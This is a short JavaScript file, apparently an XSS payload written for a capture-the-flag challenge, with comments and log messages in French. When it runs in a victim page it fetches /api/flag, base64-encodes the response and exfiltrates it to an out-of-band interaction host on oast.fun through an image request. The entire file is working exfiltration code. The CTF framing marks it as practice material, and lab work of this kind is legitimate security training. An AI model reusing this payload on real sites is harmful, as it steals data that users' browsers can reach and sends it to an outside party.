(function () {
    console.log('[CTF-XSS] Initialisation du script');

    try {
        fetch('/api/flag')
            .then(function (res) {
                console.log('[CTF-XSS] Réponse reçue de /api/flag');
                return res.text();
            })
            .then(function (data) {
                console.log('[XSS] Contenu récupéré:', data);

                const encoded = btoa(data);
                console.log('[CTF-XSS] Donnée encodée:', encoded);

                const exfilUrl = 'https://kwzvnipoylejwhfgszax4idsmvlc0jrjt.oast.fun/?bug=' + encodeURIComponent(encoded);
                console.log('[CTF-XSS] Exfiltration vers:', exfilUrl);

                const img = new Image();
                img.src = exfilUrl;
            })
            .catch(function (e) {
                console.error('[CTF-XSS] Erreur pendant la récupération ou l\'envoi:', e);
            });
    } catch (err) {
        console.error('[CTF-XSS] Exception inattendue:', err);
    }
})();

